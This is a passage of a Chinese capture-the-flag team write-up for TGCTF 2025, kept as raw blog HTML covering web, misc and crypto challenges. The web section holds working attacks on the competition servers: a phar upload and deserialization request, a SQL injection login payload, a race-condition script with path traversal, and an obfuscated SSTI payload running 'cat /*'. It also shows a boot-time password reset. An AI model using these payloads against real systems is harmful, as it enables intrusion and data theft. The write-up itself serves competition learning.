header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"file\"; filename=\"evil.atg\"</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/octet-stream</span></span>\n\nGIF89a&lt;?php __HALT_COMPILER(); ?>\n此处有不可见字符省略。内容为上述脚本生成的phar\n<span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/class.php?filename=phar://./uploads/evil.atg/test.txt</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:30759</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/x-www-form-urlencoded</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">7</span></span>\n\nwow=env</code></pre>\n\n<h3 id=\"TGCTF-2025-后台管理\"><a href=\"#TGCTF-2025-后台管理\" class=\"headerlink\" title=\"TGCTF 2025 后台管理\"></a>TGCTF 2025 后台管理</h3><p>反斜杠转义字符串中的’，然后在password里打SQL注入。</p>\n<p>误打误撞试出来flag在flag表里（（（</p>\n<pre class=\"language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/login</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">124.71.147.99:9045</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">48</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://124.71.147.99:9045</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/x-www-form-urlencoded</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://124.71.147.99:9045/login</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n\nusername=1\\&amp;password=union select *,2 from flag#</code></pre>\n\n<p>在setcookie头看到flag。TGCTF{ac4ca16f-f1508c-000342}</p>\n<h3 id=\"老登，炸鱼来了？\"><a href=\"#老登，炸鱼来了？\" class=\"headerlink\" title=\"老登，炸鱼来了？\"></a>老登，炸鱼来了？</h3><p>竞争safe变量。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> aiohttp\n<span class=\"token keyword\">import</span> asyncio\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Solver</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> baseUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>baseUrl <span class=\"token operator\">=</span> baseUrl\n        self<span class=\"token punctuation\">.</span>READ_FILE_ENDPOINT <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>baseUrl<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span>\n        self<span class=\"token punctuation\">.</span>VALID_CHECK_PARAMETER <span class=\"token operator\">=</span> <span class=\"token string\">'/write?name=123.md&amp;content=flag&amp;format=markdown'</span>\n        self<span class=\"token punctuation\">.</span>INVALID_CHECK_PARAMETER <span class=\"token operator\">=</span> <span class=\"token string\">'/read?name=../../../../../flag'</span>\n        self<span class=\"token punctuation\">.</span>RACE_CONDITION_JOBS <span class=\"token operator\">=</span> <span class=\"token number\">100</span>\n\n    <span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">setSessionCookie</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">await</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>baseUrl<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">raceValidationCheck</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> parameter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        url <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>READ_FILE_ENDPOINT<span class=\"token punctuation\">&#125;</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>parameter<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span>\n        <span class=\"token keyword\">async</span> <span class=\"token keyword\">with</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> response<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">await</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">raceCondition</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        tasks <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>RACE_CONDITION_JOBS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            tasks<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>raceValidationCheck<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>VALID_CHECK_PARAMETER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            tasks<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>raceValidationCheck<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>INVALID_CHECK_PARAMETER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">await</span> asyncio<span class=\"token punctuation\">.</span>gather<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>tasks<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">async</span> <span class=\"token keyword\">def</span> <span class=\"token function\">solve</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">async</span> <span class=\"token keyword\">with</span> aiohttp<span class=\"token punctuation\">.</span>ClientSession<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> session<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">await</span> asyncio<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># wait for the reverse proxy creation</span>\n\n            attempts <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n            finishedRaceConditionJobs <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n            <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'[*] Attempts #</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>attempts<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> - Finished race condition jobs: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>finishedRaceConditionJobs<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">'\\r'</span><span class=\"token punctuation\">)</span>\n\n                results <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> self<span class=\"token punctuation\">.</span>raceCondition<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span>\n                attempts <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n                finishedRaceConditionJobs <span class=\"token operator\">+=</span> self<span class=\"token punctuation\">.</span>RACE_CONDITION_JOBS\n                <span class=\"token keyword\">for</span> result <span class=\"token keyword\">in</span> results<span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token string\">'TGCTF&#123;'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> result<span class=\"token punctuation\">:</span>\n                        <span class=\"token keyword\">continue</span>\n\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'\\n[+] We won the race window! Flag: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>result<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n                    exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> name <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    baseUrl <span class=\"token operator\">=</span> <span class=\"token string\">'http://node1.tgctf.woooo.tech:30308'</span> <span class=\"token comment\"># for local testing</span>\n    <span class=\"token comment\"># baseUrl = 'http://49.13.169.154:8088'</span>\n    solver <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span>baseUrl<span class=\"token punctuation\">)</span>\n\n    asyncio<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>solver<span class=\"token punctuation\">.</span>solve<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"直面天命（复仇）\"><a href=\"#直面天命（复仇）\" class=\"headerlink\" title=\"直面天命（复仇）\"></a>直面天命（复仇）</h3><p>直接去非复仇版本里读：</p>\n<p><a href=\"http://node1.tgctf.woooo.tech:31514/aazz?filename=a/b/c/d/secret.py\">http://node1.tgctf.woooo.tech:31514/aazz?filename=a/b/c/d/secret.py</a></p>\n<p>secret_key &#x3D; “直面天命”</p>\n<p>然后标准SSTI即可。unicode编码绕过。 。 </p>\n<pre class=\"language-bash\" data-language=\"bash\"><code class=\"language-bash\">直面天命g<span class=\"token punctuation\">[</span><span class=\"token string\">'\\u0070\\u006f\\u0070'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">'so'</span><span class=\"token punctuation\">[</span>::-1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'\\u0070\\u006f\\u0070\\u0065\\u006e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cat /*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'\\u0072\\u0065\\u0061\\u0064'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>难违</code></pre>\n\n\n\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"next-is-the-end\"><a href=\"#next-is-the-end\" class=\"headerlink\" title=\"next is the end\"></a>next is the end</h3><p>手动打开文件夹，得到flag。</p>\n<p><img src=\"/images/1744633170179-41.png\" alt=\"img\" loading=\"lazy\"></p>\n<h3 id=\"where-it-is\"><a href=\"#where-it-is\" class=\"headerlink\" title=\"where_it_is\"></a>where_it_is</h3><p>百度识图找到另一个视角的正面图。</p>\n<p><img src=\"/images/1744633170179-42.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>可以模糊看出学校名前两个字**”内湖”**，结合原图的职业二字，在360地图搜索找到对应学校。</p>\n<p><img src=\"/images/1744633170179-43.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>旁边的站就是港墘站</p>\n<p>TGCTF{港墘站}</p>\n<h3 id=\"你的运气是好是坏？\"><a href=\"#你的运气是好是坏？\" class=\"headerlink\" title=\"你的运气是好是坏？\"></a>你的运气是好是坏？</h3><p>CTF自然常数（。</p>\n<p>flag{114514}</p>\n<h3 id=\"TeamGipsy-ctfer\"><a href=\"#TeamGipsy-ctfer\" class=\"headerlink\" title=\"TeamGipsy&amp;ctfer\"></a>TeamGipsy&amp;ctfer</h3><p>vm运行虚拟机，发现有密码。</p>\n<p>在开机时按shift，再按e修改，把ro quiet splash $vt_handoff修改为rw init&#x3D;&#x2F;bin&#x2F;bash，再按F10启动。</p>\n<p>然后找到用户名，修改密码为123即可。</p>\n<p><img src=\"/images/1744633170179-44.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>桌面存在一个mimi.txt记录着之前的指令，发现之前启了两个容器，并且有mysql数据库。</p>\n<p><img src=\"/images/1744633170179-45.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>重新start之前的docker，并且用文本文件里面的mysql密码连上flag，在其中一个docker的mysql数据库中可以找到flag。</p>\n<p><img src=\"/images/1744633170179-46.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1744633170179-47.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>HZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}</p>\n<h3 id=\"ez-zip\"><a href=\"#ez-zip\" class=\"headerlink\" title=\"ez_zip\"></a>ez_zip</h3><p>最外层直接爆破出zip密码为20250412，得到一个sh512.txt和End.zip，sh512.txt里面有一句话。</p>\n<p>打开End.zip发现里面是End文件夹以及flag.zip和一个sh512.txt，并且sh512.txt原大小为128字节。</p>\n<p>所以可知要将sh512.txt内容进行sha512加密，构建一个End.zip，进行明文爆破。</p>\n<p><img src=\"/images/1744633170179-48.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>将sha512结果存放End&#x2F;sh512.txt</p>\n<p><img src=\"/images/1744633170179-49.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>deflate压缩，压缩等级1。</p>\n<p><img src=\"/images/1744633170179-50.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>使用ARCHPR进行明文攻击解压出flag.zip。</p>\n<p><img src=\"/images/1744633170179-51.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>没法正常解压，使用010的zip模板进行修复。</p>\n<p>将frFileNameLength改为8，压缩方式改成DEFLATE保存，即可解压得到flag。</p>\n<p><img src=\"/images/1744633170179-52.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1744633170179-53.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>TGCTF{Warrior_You_have_defeated_the_giant_dragon!}</p>\n<h3 id=\"这是啥o-o\"><a href=\"#这是啥o-o\" class=\"headerlink\" title=\"这是啥o_o\"></a>这是啥o_o</h3><p>给了一个gif发现后面有疑似二维码的碎片,拼接得到一个汉信码</p>\n<p><img src=\"/images/1744633170179-54.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>扫描得到提示 time is your fortune ,efficiency is your life</p>\n<p>推测和gif的延迟时间有关,修改010的gif模板,打印一下延迟时间得到一组看起来就很像asicc的东西</p>\n<p><img src=\"/images/1744633170179-55.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>解码得到flag</p>\n<pre class=\"language-Plain\" data-language=\"Plain\"><code class=\"language-Plain\">enc&#x3D;[84,71,67,84,70,123,89,111,117,95,99,97,117,103,104,116,95,117,112,95,119,105,116,104,95,116,105,109,101,33,125]\nfor i in enc:\n    print(chr(i),end&#x3D;&#39;&#39;)</code></pre>\n\n<blockquote>\n<p>TGCTF{You_caught_up_with_time!}</p>\n</blockquote>\n<h3 id=\"你能发现图中的秘密吗\"><a href=\"#你能发现图中的秘密吗\" class=\"headerlink\" title=\"你能发现图中的秘密吗?\"></a>你能发现图中的秘密吗?</h3><p>题目给出一个压缩包和一个png,压缩包有密码</p>\n<p>png查看red通道的lsb,发现密钥</p>\n<p><img src=\"/images/1744633170179-56.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>解压后给了一个png一个pdf</p>\n<p>查看pdf的二进制数据发现有ps相关的东西,用ps打开,发现了隐藏的flag图层查看获得第二段flag</p>\n<p><img src=\"/images/1744633170179-57.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>final_challenge2.png的一个chunk大小异常。</p>\n<p><img src=\"/images/1744633170179-58.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>提取，补上png文件头文件尾，然后爆破宽高就可以找到正确的宽高图片。</p>\n<p><img src=\"/images/1744633170179-59.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>flag{you_are_so_attentive_and_conscientous}</p>\n","excerpt":"","more":"<h1 id=\"战队名：不知道\"><a href=\"#战队名：不知道\" class=\"headerlink\" title=\"战队名：不知道\"></a>战队名：不知道</h1><p><strong>排名：3</strong></p>\n<p><img src=\"/images/1cf021f7478de3e000412729a45b5e50-1744633170181-120.png\"></p>\n<h2 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h2><h3 id=\"AAAAAAAA·真·签到\"><a href=\"#AAAAAAAA·真·签到\" class=\"headerlink\" title=\"AAAAAAAA·真·签到\"></a>AAAAAAAA·真·签到</h3><p>UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}</p>\n<p>和flag头对比发现偏移是-1，0，1，2，3，推测就是%26逐渐++</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">enc<span class=\"token operator\">=</span><span class=\"token string\">'UGBRC&#123;RI0G!O04_5C3_OVUI_DV_MNTB&#125;'</span>\n\ns<span class=\"token operator\">=</span><span class=\"token string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span>\n\n        ind<span class=\"token operator\">=</span>s<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        ind<span class=\"token operator\">+=</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>ind<span class=\"token operator\">%</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></code></pre>\n\n<blockquote>\n<p>TGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}</p>\n</blockquote>\n<h3 id=\"mm不躲猫猫\"><a href=\"#mm不躲猫猫\" class=\"headerlink\" title=\"mm不躲猫猫\"></a>mm不躲猫猫</h3><p>给了60组n，c，n有公共因子gcd求得解密即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ne <span class=\"token operator\">=</span> <span class=\"token number\">65537</span>\n\nn_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nc_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\ncurrent_n <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\ncurrent_c <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'E:\\\\wenjian\\\\p\\\\timu\\\\tgCTF\\\\cry\\\\challenge.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span>\n        line <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> line<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'['</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> line<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span><span class=\"token string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> current_n <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">and</span> current_c <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n                n_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>current_n<span class=\"token punctuation\">)</span>\n                c_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>current_c<span class=\"token punctuation\">)</span>\n                current_n <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n                current_c <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n        <span class=\"token keyword\">elif</span> line<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'n = '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            current_n <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> line<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'c = '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            current_c <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">if</span> current_n <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">and</span> current_c <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        n_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>current_n<span class=\"token punctuation\">)</span>\n        c_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>current_c<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c_list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    n<span class=\"token operator\">=</span>n_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n    other<span class=\"token operator\">=</span>n_list<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> n_list<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n    p<span class=\"token operator\">=</span><span class=\"token boolean\">None</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> other<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> GCD<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            p<span class=\"token operator\">=</span>GCD<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span>\n            q<span class=\"token operator\">=</span>n<span class=\"token operator\">//</span>p\n            <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">if</span> p <span class=\"token operator\">==</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">continue</span>\n\n    d<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token 